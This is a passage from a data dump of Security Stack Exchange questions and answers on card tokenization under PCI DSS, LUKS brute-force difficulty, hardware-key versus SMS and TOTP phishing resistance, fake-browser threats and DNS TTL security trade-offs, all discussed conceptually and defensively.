","20","9","261485","<p>I have complete faith in VeraCrypt. On each of my computers, I have created a VeraCrypt folder and copied the User folders (Docs, Pictures, Videos, etc.) into it. From then on, I only use the User's Music folder (no need for privacy), and always read and write personal files to the VeraCrypt folders (which open as a virtual drive). When I don't need to access these folders, all I have to do is close the virtual drive and exit VeraCrypt. Nobody is aware that VeraCrypt's vault file actually contains my encrypted folders.</p>
","0"
"261401","261401","How do companies like Uber and Paypal store card details? Is it possible to offer PCI compliance whilst saving credit card details locally?","<p>I know there's a question that's been already asked but it's a decade old so wanted to get an up to date answer...</p>
<p>It's mentioned quite often that the CVV number should never be stored, but this must be the case for companies where frictionless payment is offered. How would a company like Uber do this and uphold PCI compliance?</p>
<p>Would it be possible to do this using the keystores for IOS/Android and still have PCI compliance?</p>
","2","3","261402","<p>The answer is that they don't store credit card details at all. They store credit card payment data using tokenization. See e.g. <a href=""https://squareup.com/us/en/townsquare/what-does-tokenization-actually-mean"" rel=""nofollow noreferrer"">https://squareup.com/us/en/townsquare/what-does-tokenization-actually-mean</a> for a primer.</p>
","1"
"261401","261401","How do companies like Uber and Paypal store card details? Is it possible to offer PCI compliance whilst saving credit card details locally?","<p>I know there's a question that's been already asked but it's a decade old so wanted to get an up to date answer...</p>
<p>It's mentioned quite often that the CVV number should never be stored, but this must be the case for companies where frictionless payment is offered. How would a company like Uber do this and uphold PCI compliance?</p>
<p>Would it be possible to do this using the keystores for IOS/Android and still have PCI compliance?</p>
","2","3","261403","<p>For merchants that do automated/recurring billing - most payment gateways offer a way for merchants to store credit card information on the gateway's servers in a tokenized fashion, so that merchant can charge customers' credit cards without the need for the customer to provide their card information for each charge.</p>
<p>For more info, see:</p>
<p><a href=""https://www.authorize.net/resources/find-a-partner/certified-solutions/authorizenet-cim---magemart.html"" rel=""nofollow noreferrer"">https://www.authorize.net/resources/find-a-partner/certified-solutions/authorizenet-cim---magemart.html</a></p>
<p><a href=""https://www.authorize.net/en-us/resources/our-features/recurring-payments.html"" rel=""nofollow noreferrer"">https://www.authorize.net/en-us/resources/our-features/recurring-payments.html</a></p>
","1"
"261401","261401","How do companies like Uber and Paypal store card details? Is it possible to offer PCI compliance whilst saving credit card details locally?","<p>I know there's a question that's been already asked but it's a decade old so wanted to get an up to date answer...</p>
<p>It's mentioned quite often that the CVV number should never be stored, but this must be the case for companies where frictionless payment is offered. How would a company like Uber do this and uphold PCI compliance?</p>
<p>Would it be possible to do this using the keystores for IOS/Android and still have PCI compliance?</p>
","2","3","261435","<p>To add to the other comments, CVV2 / CVC2 is not required for recurring / account-on-file transactions. The first transaction made with the merchant generally does need the CVC2 or in the EU secure customer authentication. For subsequent transactions there is a special flag on the transaction that is for account on file and the issuer will authorise and pay without CVV2.</p>
<p>Some larger merchants will also 'trade' the PAN for an EMV token provided by the card issuer (usually Mastercard or Visa on behalf of the issuer) and then will store just the EMV token which can also be used for recurring payments without the CVV2 and has the advantage that it doesn't need to be protected by the PCI DSS requirements.</p>
<p>To answer your second question, you can't store PAN and CVV2 in a consumer application - although the consumer device is not in your PCI DSS scope, your app is, and so you would be breaking the &quot;don't store sensitive authentication data after auth&quot; rule. It's also not a great way of doing it. If you are going straight from your app to the acquirer for auth (ie bypassing your own servers) the it is better for your app to request a token from the acquirer and then store the token in the keystore as previous commenters have alluded to. Otherwise store the token in your server environment and match it up to the app user.</p>
","4"
"261383","261383","How difficult is it so decrypt a disk encrypted with luksOpen?","<p>I have encrypted a disk on my Ubuntu machine using</p>
<p><code>sudo cryptsetup luksOpen /dev/sdb1 sdb1</code></p>
<p>I'm wondering how difficult is it to decrypt this disk using bruteforce password guessing?
What does the success rate depend on?</p>
","0","3","261388","<p>As far as we know, chances of brute-forcing the LUKS header are fairly low.</p>
<p>LUKS uses resource-consuming key derivation functions that will force every password attempt to consume a significant time (e.g. 0.1s on a modern CPU).</p>
<p>You can yourself calculate how much passwords can be tried in a day or a week.</p>
","0"
"261383","261383","How difficult is it so decrypt a disk encrypted with luksOpen?","<p>I have encrypted a disk on my Ubuntu machine using</p>
<p><code>sudo cryptsetup luksOpen /dev/sdb1 sdb1</code></p>
<p>I'm wondering how difficult is it to decrypt this disk using bruteforce password guessing?
What does the success rate depend on?</p>
","0","3","261390","<p>It's depending on the amount and performance of the CPU(s)/GPU(s). The speed decreases drastically when the file system doesnt fit in your (V)RAM.</p>
<p>For example a GTX 1080 TI can crack about 14k passwords per second on a small file system.
<a href=""https://www.onlinehashcrack.com/tools-benchmark-hashcat-nvidia-gtx-1080-ti.php"" rel=""nofollow noreferrer"">Source</a> (mode 14600)</p>
","0"
"261383","261383","How difficult is it so decrypt a disk encrypted with luksOpen?","<p>I have encrypted a disk on my Ubuntu machine using</p>
<p><code>sudo cryptsetup luksOpen /dev/sdb1 sdb1</code></p>
<p>I'm wondering how difficult is it to decrypt this disk using bruteforce password guessing?
What does the success rate depend on?</p>
","0","3","261396","<blockquote>
<p>I'm wondering how difficult is it to decrypt this disk using bruteforce password guessing?</p>
</blockquote>
<p><a href=""https://blog.elcomsoft.com/2020/08/breaking-luks-encryption/"" rel=""noreferrer"">It's not difficult</a>, but it's time consuming. You only need the LUKS header and a lot of processing power. The default KDF is <code>aes-cbc-essiv:sha256</code>, and that means around 4k hashes per second on a RTX 2070 or around 200 in an i7-9700.</p>
<blockquote>
<p>What does the success rate depend on?</p>
</blockquote>
<p>It will depend on the password strength and KDF parameters choosen. If the password is random, long (16+ chars), the iteration count is high (to take 10 seconds or more) and WHIRLPOOL is selected as the hashing function for the KDF, the chances of breaking it are almost zero.</p>
<p>If the password can be attacked using a dictionary, or is found on a password leak, your chances are better. If the user have the same password for his email and LUKS, and the password already leaked, you can decrypt it in one try.</p>
","5"
"261349","261349","Is a hardware based 2FA more resistant to phishing than SMS or TOTP?","<p>As I understand, modern phishing is kind of like a man-in-the-middle attack. Let's say, for example that User u has an account in Domain d where he has an SMS based 2FA enabled. This is what the phishing mechanism is like:</p>
<ol>
<li>Attacker presents a login page on a domain d' which looks similar to the login page of the domain d.</li>
<li>User u does not recognize this and he enters his credentials to this page on d'.</li>
<li>Attacker turns around and uses these credentials to login into Domain d.</li>
<li>Domain d sends u an OTP on his phone.</li>
<li>Attacker presents u an OTP verification page on domain d'.</li>
<li>User u enters this OTP on d'.</li>
<li>Attacker turns around and uses this OTP to authenticate himself on Domain d.</li>
</ol>
<p>Now, if the user u had a hardware key, the last few steps would be very similar.</p>
<ol start=""4"">
<li>Domain d sends attacker a challenge.</li>
<li>Attacker reelays the challenge to the fake page on domain d'.</li>
<li>User uses his hardware key to sign the challenge.</li>
<li>Attacker turns around and submits the signed challenge to domain d, pretending to be u.</li>
</ol>
<p>So, in what way is a hardware based authentication mechanism like yubikey better than SMS based OTP, or TOTP codes?</p>
","3","3","261354","<p>With regard to phishing the exploited weak link is the user so very little difference in the kind of MFA used.</p>
<p>But there are plenty of scenarios where a user password is compromised through no fault of his/her own, and then there is a big difference between e.g. a SMS based OTP that is vulnerable to SIM swapping, and a YubiKey/SecureID that actually needs to be stolen.</p>
","0"
"261349","261349","Is a hardware based 2FA more resistant to phishing than SMS or TOTP?","<p>As I understand, modern phishing is kind of like a man-in-the-middle attack. Let's say, for example that User u has an account in Domain d where he has an SMS based 2FA enabled. This is what the phishing mechanism is like:</p>
<ol>
<li>Attacker presents a login page on a domain d' which looks similar to the login page of the domain d.</li>
<li>User u does not recognize this and he enters his credentials to this page on d'.</li>
<li>Attacker turns around and uses these credentials to login into Domain d.</li>
<li>Domain d sends u an OTP on his phone.</li>
<li>Attacker presents u an OTP verification page on domain d'.</li>
<li>User u enters this OTP on d'.</li>
<li>Attacker turns around and uses this OTP to authenticate himself on Domain d.</li>
</ol>
<p>Now, if the user u had a hardware key, the last few steps would be very similar.</p>
<ol start=""4"">
<li>Domain d sends attacker a challenge.</li>
<li>Attacker reelays the challenge to the fake page on domain d'.</li>
<li>User uses his hardware key to sign the challenge.</li>
<li>Attacker turns around and submits the signed challenge to domain d, pretending to be u.</li>
</ol>
<p>So, in what way is a hardware based authentication mechanism like yubikey better than SMS based OTP, or TOTP codes?</p>
","3","3","261355","<p>Your described <em>phishing mechanism</em> is a very specific workflow; phishing attempts are not limited to it, alone! If you think outside of this single scenario, you will be able to recognize the benefits.</p>
<p>With software based TOPT 2FA, the secret is not protected by a hardware layer. This means the user has (or at least had) access to the seed, making it easy to copy the entire authentication factor. In addition to malware based attacks, someone could phish this information or, e.g., take a picture of a QR code used to deliver it, as the QR code is not disposable, but has all the information required to generate the TOPT codes forever.</p>
<p><a href=""https://i.stack.imgur.com/RJkpk.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/RJkpk.png"" alt=""Example TOPT QR code"" /></a></p>
<p>This QR code simply has the URL <code>otpauth://totp/example?secret=correcthorsebatterystaple&amp;algorithm=SHA512&amp;digits=6&amp;period=30</code></p>
<p>For example, Google Authenticator allows <a href=""https://support.google.com/accounts/answer/1066447#zippy=%2Ctransfer-google-authenticator-codes-to-new-phone"" rel=""nofollow noreferrer"">Transferring codes to new phone</a> by revealing the secrets via QR codes. An unsuspecting user may be enticed to use this feature and pass on the QR codes.</p>
<p>With a hardware based TOPT the secret is stored separately, so no malware can access it directly. Also, because users do not have access to the seed, they could only give away the current TOPT code, narrowing the time window an attacker has.</p>
","1"
"261349","261349","Is a hardware based 2FA more resistant to phishing than SMS or TOTP?","<p>As I understand, modern phishing is kind of like a man-in-the-middle attack. Let's say, for example that User u has an account in Domain d where he has an SMS based 2FA enabled. This is what the phishing mechanism is like:</p>
<ol>
<li>Attacker presents a login page on a domain d' which looks similar to the login page of the domain d.</li>
<li>User u does not recognize this and he enters his credentials to this page on d'.</li>
<li>Attacker turns around and uses these credentials to login into Domain d.</li>
<li>Domain d sends u an OTP on his phone.</li>
<li>Attacker presents u an OTP verification page on domain d'.</li>
<li>User u enters this OTP on d'.</li>
<li>Attacker turns around and uses this OTP to authenticate himself on Domain d.</li>
</ol>
<p>Now, if the user u had a hardware key, the last few steps would be very similar.</p>
<ol start=""4"">
<li>Domain d sends attacker a challenge.</li>
<li>Attacker reelays the challenge to the fake page on domain d'.</li>
<li>User uses his hardware key to sign the challenge.</li>
<li>Attacker turns around and submits the signed challenge to domain d, pretending to be u.</li>
</ol>
<p>So, in what way is a hardware based authentication mechanism like yubikey better than SMS based OTP, or TOTP codes?</p>
","3","3","261357","<p><strong>Let me start with a basic summary of some types of protection:</strong></p>
<ol>
<li>SMS.  Sent via text message to mobile phone.  Vulnerable to interception/spoofing, since SMS is not a secure channel.</li>
<li>TOTP  Generated via TOTP device (smart phone app, key fob, etc.).  TOTP codes are generated offline, so no vulnerability to interception/spoofing of the TOTP code itself.  Provides no protection against phishing.</li>
<li>Security key (e.g., U2F).  Generated via key fob and similar. Protects against phishing, since the challenge-response step uses a signed challenge; the phishing site won't have the key, so the response step will fail.  <a href=""https://security.googleblog.com/2019/05/new-research-how-effective-is-basic.html"" rel=""nofollow noreferrer"">According to google</a>, security keys are highly effective at thwarting phishing attacks, including targeted phishing attacks.</li>
</ol>
<p>Note that Yubikey sells both TOTP and U2F devices.</p>
<p><strong>What U2F hardware accomplishes:</strong></p>
<p>Where a U2F hardware beats out TOTP is when someone tries to perform a phishing attack during steps 4-7 from OP.  The U2F key is bound to the origin's domain (and the authentication requires TLS), so a phishing domain cannot receive the key.  SMS and TOTP are vulnerable to phishing via look-a-like domains (or inattentive users), whereas U2F will only send the response if the challenge is from the right domain.</p>
<p>U2F does fail if the attacker is able to acquire a valid certificate for the origin's domain.  However, at that point the attacker can man-in-the-middle the post-authenticated connection and steal the user's authentication cookie, so protecting the authentication channel from such attacks provides little value regardless.</p>
<p>Obligatory pedantic note: Technically, U2F can use token binding to block authentication even if the attacker has a valid certificate for the origin.  However, the browsers have explicitly decided it's not worth bothering to support that, probably because protecting the authentication step itself is kind of useless if the communication channel itself is compromised.</p>
","3"
"261324","261324","What protects users from fake web browsers?","<p>Suppose a hacker creates a Windows application that looks and feels like a legitimate web browser. The user believes they are using, say, Google Chrome. If you simply watched the bits going to and from the computer over the network, it would look like the user in fact was using a legitimate browser like Google Chrome.</p>
<p>However, on the client side, this fake browser records all keystrokes entered by the user, and from that data, deduces the user's website/password-manager passwords. In the background, this data is continuously transmitted to the hacker.</p>
<p>Alternatively, this fake browser could act like a legitimate browser for all URL's entered by the user except for some specific exceptions. Perhaps for a banking URL like chase.com, the browser does a phony DNS-resolution and serves up content from a different site owned by the hacker, fooling the user into entering login credentials or other sensitive info.</p>
<p>Are attacks like these possible? If not, what mechanisms are in place to thwart such attempts?</p>
<p>I tried googling for phrases like &quot;fake browser hack&quot; but have not found anything that seems to resemble this.</p>
","21","6","261326","<blockquote>
<p>Are attacks like these possible?</p>
</blockquote>
<p>Yes. A hacker just needs to download the Firefox source code, recompile it, and distribute it.</p>
<blockquote>
<p>If not, what mechanisms are in place to thwart such attempts?</p>
</blockquote>
<p>A user could download browsers from their official sites, not third party sites. They could also use <a href=""https://itsfoss.com/package-manager/"" rel=""noreferrer"">package managers</a> or app stores that are associated with many operating systems.</p>
","67"
"261324","261324","What protects users from fake web browsers?","<p>Suppose a hacker creates a Windows application that looks and feels like a legitimate web browser. The user believes they are using, say, Google Chrome. If you simply watched the bits going to and from the computer over the network, it would look like the user in fact was using a legitimate browser like Google Chrome.</p>
<p>However, on the client side, this fake browser records all keystrokes entered by the user, and from that data, deduces the user's website/password-manager passwords. In the background, this data is continuously transmitted to the hacker.</p>
<p>Alternatively, this fake browser could act like a legitimate browser for all URL's entered by the user except for some specific exceptions. Perhaps for a banking URL like chase.com, the browser does a phony DNS-resolution and serves up content from a different site owned by the hacker, fooling the user into entering login credentials or other sensitive info.</p>
<p>Are attacks like these possible? If not, what mechanisms are in place to thwart such attempts?</p>
<p>I tried googling for phrases like &quot;fake browser hack&quot; but have not found anything that seems to resemble this.</p>
","21","6","261327","<p>Yes, it is completely possible to create such a browser. Given that chromium is open-source, it is easy to make minor modifications and produce a browser that, on the surface, appears to be Google Chrome, but is in fact a malicious knock-off.</p>
<p>The difficult part is distributing this browser to users. Any sane user would install Chrome by going to Google's website and downloading the official installer. It helps that googling anything like &quot;install Chrome&quot; naturally leads to Google's website as the first link. Thus, normal users will end up with the official version of Chrome and not your knock-off.</p>
","10"
"261324","261324","What protects users from fake web browsers?","<p>Suppose a hacker creates a Windows application that looks and feels like a legitimate web browser. The user believes they are using, say, Google Chrome. If you simply watched the bits going to and from the computer over the network, it would look like the user in fact was using a legitimate browser like Google Chrome.</p>
<p>However, on the client side, this fake browser records all keystrokes entered by the user, and from that data, deduces the user's website/password-manager passwords. In the background, this data is continuously transmitted to the hacker.</p>
<p>Alternatively, this fake browser could act like a legitimate browser for all URL's entered by the user except for some specific exceptions. Perhaps for a banking URL like chase.com, the browser does a phony DNS-resolution and serves up content from a different site owned by the hacker, fooling the user into entering login credentials or other sensitive info.</p>
<p>Are attacks like these possible? If not, what mechanisms are in place to thwart such attempts?</p>
<p>I tried googling for phrases like &quot;fake browser hack&quot; but have not found anything that seems to resemble this.</p>
","21","6","261328","<p>The challenge the attacker would face would be duping users into installing the malicious web browser on their system.</p>
<p>Windows has a security feature called User Account Control (UAC) specifically for the purpose of mitigating this threat.  When a user attempts to install a new program on a Microsoft Windows system, Windows checks that the installation file is digitally signed using a certificate that Windows trusts.  If the program is not signed using a trusted certificate, then the user is presented with a warning like the one below:</p>
<p><img src=""https://i.stack.imgur.com/DbHUY.jpg"" alt=""Alt text"" /></p>
","23"
"261324","261324","What protects users from fake web browsers?","<p>Suppose a hacker creates a Windows application that looks and feels like a legitimate web browser. The user believes they are using, say, Google Chrome. If you simply watched the bits going to and from the computer over the network, it would look like the user in fact was using a legitimate browser like Google Chrome.</p>
<p>However, on the client side, this fake browser records all keystrokes entered by the user, and from that data, deduces the user's website/password-manager passwords. In the background, this data is continuously transmitted to the hacker.</p>
<p>Alternatively, this fake browser could act like a legitimate browser for all URL's entered by the user except for some specific exceptions. Perhaps for a banking URL like chase.com, the browser does a phony DNS-resolution and serves up content from a different site owned by the hacker, fooling the user into entering login credentials or other sensitive info.</p>
<p>Are attacks like these possible? If not, what mechanisms are in place to thwart such attempts?</p>
<p>I tried googling for phrases like &quot;fake browser hack&quot; but have not found anything that seems to resemble this.</p>
","21","6","261341","<p>Faking a complete browser is not necessary for most attacks. There are phishing lures which fake a single browser window displaying a Facebook/Gmail login page in the attempt to collect usernames and passwords. Some of these lures are javascript applets running in your real browser (google &quot;Browser in the browser attack&quot;). This has a big advantage of having access to passwords stored in the real browser: users who would have installed a complete fake browser would be suspicious if they find that there is no stored password for Facebook in it.</p>
","9"
"261324","261324","What protects users from fake web browsers?","<p>Suppose a hacker creates a Windows application that looks and feels like a legitimate web browser. The user believes they are using, say, Google Chrome. If you simply watched the bits going to and from the computer over the network, it would look like the user in fact was using a legitimate browser like Google Chrome.</p>
<p>However, on the client side, this fake browser records all keystrokes entered by the user, and from that data, deduces the user's website/password-manager passwords. In the background, this data is continuously transmitted to the hacker.</p>
<p>Alternatively, this fake browser could act like a legitimate browser for all URL's entered by the user except for some specific exceptions. Perhaps for a banking URL like chase.com, the browser does a phony DNS-resolution and serves up content from a different site owned by the hacker, fooling the user into entering login credentials or other sensitive info.</p>
<p>Are attacks like these possible? If not, what mechanisms are in place to thwart such attempts?</p>
<p>I tried googling for phrases like &quot;fake browser hack&quot; but have not found anything that seems to resemble this.</p>
","21","6","261352","<p>Administrators creating user accounts without administrative access to the computer is a very strong deterrent for these sorts of attacks because it requires an administrator to install new software. It also prevents a broad range of other attacks that users fall prey to.</p>
<p>For use cases outside of an administrated network, there is little to protect users from themselves. They can and frequently do install operating systems from unauthorized sources.</p>
<p>The best way to protect against these threats is simply to try and teach people about the most basic methods to protect themselves.</p>
","1"
"261324","261324","What protects users from fake web browsers?","<p>Suppose a hacker creates a Windows application that looks and feels like a legitimate web browser. The user believes they are using, say, Google Chrome. If you simply watched the bits going to and from the computer over the network, it would look like the user in fact was using a legitimate browser like Google Chrome.</p>
<p>However, on the client side, this fake browser records all keystrokes entered by the user, and from that data, deduces the user's website/password-manager passwords. In the background, this data is continuously transmitted to the hacker.</p>
<p>Alternatively, this fake browser could act like a legitimate browser for all URL's entered by the user except for some specific exceptions. Perhaps for a banking URL like chase.com, the browser does a phony DNS-resolution and serves up content from a different site owned by the hacker, fooling the user into entering login credentials or other sensitive info.</p>
<p>Are attacks like these possible? If not, what mechanisms are in place to thwart such attempts?</p>
<p>I tried googling for phrases like &quot;fake browser hack&quot; but have not found anything that seems to resemble this.</p>
","21","6","261408","<p>I believe the answer is that anti-virus software could potentially pick it up as malicious based on &quot;<strong>heuristic analysis</strong>&quot; -- that is, modern AV software has an understanding of common malicious hooks and suspicious actions and can flag programs based on that, even if it has never seen that particular program before. This is why sometimes innocent programs end up getting flagged by antivirus: they were doing something that may not have been intended as malicious but fit some recognized pattern.</p>
<p>Alternatively, the heuristics never catch it but eventually it gets found out, and added specifically to AV software as &quot;known malicious&quot;.</p>
<p>Disclaimer: I'm no expert on what, precisely, heuristic AV is looking for, or what you can get away with without setting it off, but no one else has mentioned it.</p>
<p>More info: <a href=""https://usa.kaspersky.com/resource-center/definitions/heuristic-analysis"" rel=""nofollow noreferrer"">https://usa.kaspersky.com/resource-center/definitions/heuristic-analysis</a></p>
","1"
"261312","261312","Does the Time-To-Live (TTL) value of DNS records have any security implications?","<p>I'm currently reading about <a href=""https://en.wikipedia.org/wiki/Domain_Name_System#Resource_records"" rel=""nofollow noreferrer"">resource record</a> in the <a href=""https://en.wikipedia.org/wiki/Domain_Name_System"" rel=""nofollow noreferrer"">Domain Name System (DNS)</a>, in particular about the <a href=""https://en.wikipedia.org/wiki/Time_to_live#DNS_records"" rel=""nofollow noreferrer"">Time to live (TTL)</a>  aspect of <a href=""https://en.wikipedia.org/wiki/SOA_record"" rel=""nofollow noreferrer"">start of authority records (SOA)</a> records. It seems to me that the TTL was firstly defined in <a href=""https://www.rfc-editor.org/rfc/rfc1034.txt"" rel=""nofollow noreferrer"">RFC 1034</a> and later redefined in <a href=""https://www.rfc-editor.org/rfc/rfc2308.txt"" rel=""nofollow noreferrer"">RFC 2308</a>.</p>
<p>A DNS configuration scan using <a href=""https://www.dnsinspect.com/stackexchange.com/10621254"" rel=""nofollow noreferrer"">dnsinspect.com</a> on the domain stackexchange.com states the following:</p>
<blockquote>
<p><strong>SOA Minimum TTL.</strong> OK. Minimum TTL value is <strong>86400</strong>. Recommended values [3600 .. 86400] (1 hour ... 1 day). Minimum TTL was redefined in RFC 2308, now it defines the period of time used by slaves to cache negative responses.</p>
</blockquote>
<p>This made me wonder if the TTL value has any influence on information security. The only thing related to information security that I could think of is <a href=""https://en.wikipedia.org/wiki/Disaster_recovery"" rel=""nofollow noreferrer"">disaster recovery (DR)</a> in the sense of  <strong>availability</strong> (<a href=""https://en.wikipedia.org/wiki/Information_security#Key_concepts"" rel=""nofollow noreferrer"">CIA triad</a>). From the <a href=""https://en.wikipedia.org/wiki/Time_to_live#DNS_records"" rel=""nofollow noreferrer"">Time to live (TTL) Wikipedia article</a>:</p>
<blockquote>
<p>Newer DNS methods that are part of a <strong>disaster recovery (DR)</strong> system may have some records deliberately set extremely low on TTL. For example, a 300-second TTL would help key records expire in 5 minutes to help ensure these records are flushed quickly worldwide. This gives administrators the ability to edit and update records in a timely manner. TTL values are &quot;per record&quot; and setting this value on specific records is sometimes honored automatically by all standard DNS systems worldwide. However, a problem persists in that some caching DNS nameservers set their own TTLs regardless of the authoritative records, thus it cannot be guaranteed that all downstream DNS servers have the new records after the TTL has expired.</p>
</blockquote>
<p>In short: Does the Time-To-Live (TTL) value of DNS records (or SOA records in particular) have any security implications? What is safer having a value being too high or too low and what are the pros and cons of that security wise?</p>
<p>Related interesting article: <a href=""https://techblog.bozho.net/short-dns-ttl-and-centralization-are-serious-risks-for-the-internet/"" rel=""nofollow noreferrer"">Short DNS record TTL and centralization are serious risks for the internet</a></p>
","0","3","261313","<p>TTL essentially defines a cache lifetime, and caches always suffer from the same issues: Too short a lifetime and the cache becomes inefficient. Too long a lifetime and it'll take long before changes propagate, especially if multiple layers of caches are used.</p>
<p>So in theory, a <strong>shorter TTL</strong> would be beneficial in terms of &quot;freshness&quot; of the record, but you run into the dangers of generating a high load on the server, as clients will constantly ask for the new record. Furthermore, as you stated in your question, other DNS servers may choose to ignore extremely short cache lifetimes and use a different lifetime instead.</p>
<p>A <strong>longer TTL</strong> has the opposite effect, reducing load on the server, while risking that any changes will not propagate quickly, leaving your users unable to connect to your server.</p>
","1"
"261312","261312","Does the Time-To-Live (TTL) value of DNS records have any security implications?","<p>I'm currently reading about <a href=""https://en.wikipedia.org/wiki/Domain_Name_System#Resource_records"" rel=""nofollow noreferrer"">resource record</a> in the <a href=""https://en.wikipedia.org/wiki/Domain_Name_System"" rel=""nofollow noreferrer"">Domain Name System (DNS)</a>, in particular about the <a href=""https://en.wikipedia.org/wiki/Time_to_live#DNS_records"" rel=""nofollow noreferrer"">Time to live (TTL)</a>  aspect of <a href=""https://en.wikipedia.org/wiki/SOA_record"" rel=""nofollow noreferrer"">start of authority records (SOA)</a> records. It seems to me that the TTL was firstly defined in <a href=""https://www.rfc-editor.org/rfc/rfc1034.txt"" rel=""nofollow noreferrer"">RFC 1034</a> and later redefined in <a href=""https://www.rfc-editor.org/rfc/rfc2308.txt"" rel=""nofollow noreferrer"">RFC 2308</a>.</p>
<p>A DNS configuration scan using <a href=""https://www.dnsinspect.com/stackexchange.com/10621254"" rel=""nofollow noreferrer"">dnsinspect.com</a> on the domain stackexchange.com states the following:</p>
<blockquote>
<p><strong>SOA Minimum TTL.</strong> OK. Minimum TTL value is <strong>86400</strong>. Recommended values [3600 .. 86400] (1 hour ... 1 day). Minimum TTL was redefined in RFC 2308, now it defines the period of time used by slaves to cache negative responses.</p>
</blockquote>
<p>This made me wonder if the TTL value has any influence on information security. The only thing related to information security that I could think of is <a href=""https://en.wikipedia.org/wiki/Disaster_recovery"" rel=""nofollow noreferrer"">disaster recovery (DR)</a> in the sense of  <strong>availability</strong> (<a href=""https://en.wikipedia.org/wiki/Information_security#Key_concepts"" rel=""nofollow noreferrer"">CIA triad</a>). From the <a href=""https://en.wikipedia.org/wiki/Time_to_live#DNS_records"" rel=""nofollow noreferrer"">Time to live (TTL) Wikipedia article</a>:</p>
<blockquote>
<p>Newer DNS methods that are part of a <strong>disaster recovery (DR)</strong> system may have some records deliberately set extremely low on TTL. For example, a 300-second TTL would help key records expire in 5 minutes to help ensure these records are flushed quickly worldwide. This gives administrators the ability to edit and update records in a timely manner. TTL values are &quot;per record&quot; and setting this value on specific records is sometimes honored automatically by all standard DNS systems worldwide. However, a problem persists in that some caching DNS nameservers set their own TTLs regardless of the authoritative records, thus it cannot be guaranteed that all downstream DNS servers have the new records after the TTL has expired.</p>
</blockquote>
<p>In short: Does the Time-To-Live (TTL) value of DNS records (or SOA records in particular) have any security implications? What is safer having a value being too high or too low and what are the pros and cons of that security wise?</p>
<p>Related interesting article: <a href=""https://techblog.bozho.net/short-dns-ttl-and-centralization-are-serious-risks-for-the-internet/"" rel=""nofollow noreferrer"">Short DNS record TTL and centralization are serious risks for the internet</a></p>
","0","3","261315","<h2>TL;DR</h2>
<p>While Time-To-Live (TTL) has a small impact on the CIA triangle, it doesn't usually carry a lot of inherent risk, nor does it generate a great deal of residual risk when mitigated with common controls. Provided you have an appropriate threat model and a well-chosen set of controls for your DNS infrastructure, you can adjust TTL to suit the needs of the organization within reasonable parameters.</p>
<h2>Analysis and Recommendations</h2>
<blockquote>
<p>Does the Time-To-Live (TTL) value of DNS records (or SOA records in particular) have any security implications? What is safer having a value being too high or too low and what are the pros and cons of that security wise?</p>
</blockquote>
<p>DNS security is primarily a function of using <a href=""https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en"" rel=""nofollow noreferrer"">DNSSEC</a>. The lime-to-live for DNS records defines the <em>maximum</em> time a caching server should cache a record without querying a more authoritative server again, but this doesn't have a lot of inherent risks. However, as you yourself pointed out, it may impact your overall security posture in various ways. Specifically:</p>
<ol>
<li><p>A long TTL means fewer lookups are done.</p>
<ul>
<li>This has pros and cons regarding availability and server load, but primarily it will reduce your ability to propagate <em>changed</em> records quickly to clients using a caching DNS resolver. This is often mitigated by using a virtual or floating IP, but it's something to keep in mind.</li>
<li>Queries that rely on cached results rather than the start-of-authority (SOA) lookups can be at risk for cache poisioning, but depending on your threat model a shorter or longer TTL won't modify this risk very much. A better control is simply to ensure that your primary caching servers query the SOA directly when possible, as TTL is really an advisory value rather than one that is enforced at all layers.</li>
</ul>
</li>
<li><p>A short TTL means the results change more often.</p>
<ul>
<li>This has pros and cons regarding freshness of data for caching clients, but can put more load on servers, increase network traffic, and can cause values to change more often.</li>
<li>While it won't dramatically increase the risk of man-in-the-middle or poisoned caches, a shorter TTL for records that change often will certainly make it harder to validate that the record hasn't changed unexpectedly unless you apply some additional controls (e.g. DNSSEC or some other means of host verification such as known SSH keys).</li>
<li>A common practice when changing A and PTR records is to reduce the TTL ahead of the changes, so this represents a bit of metadata about your activities. Again, while not a large inherent risk, it may or may not belong in your threat model.</li>
</ul>
</li>
</ol>
<p>While not a comprehensive list of all the differences, so think of these examples as representative of a slider where moving the slider more to one side or the other affects the TTL-related tradeoffs. The optimal &quot;slider position&quot; for your specific organization will vary, and can change over time.</p>
<h3>Common DNS Security Controls</h3>
<p>If you're concerned about DNS security, entire books are written on the subject. However, the advice in many of these books primarily boil down to a few key things:</p>
<ol>
<li>Turn off zone tranfsers when possible.</li>
<li>Use DNSSEC to secure your DNS data if supported by your infrastructure.</li>
<li>Host hardened and well-monitored caching servers inside your network perimeter to provide a better way to prevent or detect DNS-related tampering.</li>
<li>Use firewalls, <a href=""https://en.wikipedia.org/wiki/IPsec"" rel=""nofollow noreferrer"">IPSec</a>, <a href=""https://en.wikipedia.org/wiki/DNS_over_HTTPS"" rel=""nofollow noreferrer"">DNS over HTTPS</a>, and other network-layer controls to ensure that your clients aren't vulnerable to UDP packets from untrusted servers that respond faster than your known-good caching or SOA servers.</li>
<li>Use additional controls to validate resolved hostnames when connecting to them besides their DNS records, e.g. valid SSL certificates, known OpenSSH host keys, and so forth.</li>
</ol>
<p>This isn't meant to be a comprehensive list. It's just a very small catalog of controls that are generally more meaningful than the TTL itself. Like everything else in security, the TTL value of your DNS records represents a set of tradeoffs, but the TTL itself is rarely a primary risk vector.</p>
<p>As always, your threat model and use cases may vary. Nevertheless, this should give you a reasonable starting point for how to evaluate these issues within your specific context.</p>
","2"
"261312","261312","Does the Time-To-Live (TTL) value of DNS records have any security implications?","<p>I'm currently reading about <a href=""https://en.wikipedia.org/wiki/Domain_Name_System#Resource_records"" rel=""nofollow noreferrer"">resource record</a> in the <a href=""https://en.wikipedia.org/wiki/Domain_Name_System"" rel=""nofollow noreferrer"">Domain Name System (DNS)</a>, in particular about the <a href=""https://en.wikipedia.org/wiki/Time_to_live#DNS_records"" rel=""nofollow noreferrer"">Time to live (TTL)</a>  aspect of <a href=""https://en.wikipedia.org/wiki/SOA_record"" rel=""nofollow noreferrer"">start of authority records (SOA)</a> records. It seems to me that the TTL was firstly defined in <a href=""https://www.rfc-editor.org/rfc/rfc1034.txt"" rel=""nofollow noreferrer"">RFC 1034</a> and later redefined in <a href=""https://www.rfc-editor.org/rfc/rfc2308.txt"" rel=""nofollow noreferrer"">RFC 2308</a>.</p>
<p>A DNS configuration scan using <a href=""https://www.dnsinspect.com/stackexchange.com/10621254"" rel=""nofollow noreferrer"">dnsinspect.com</a> on the domain stackexchange.com states the following:</p>
<blockquote>
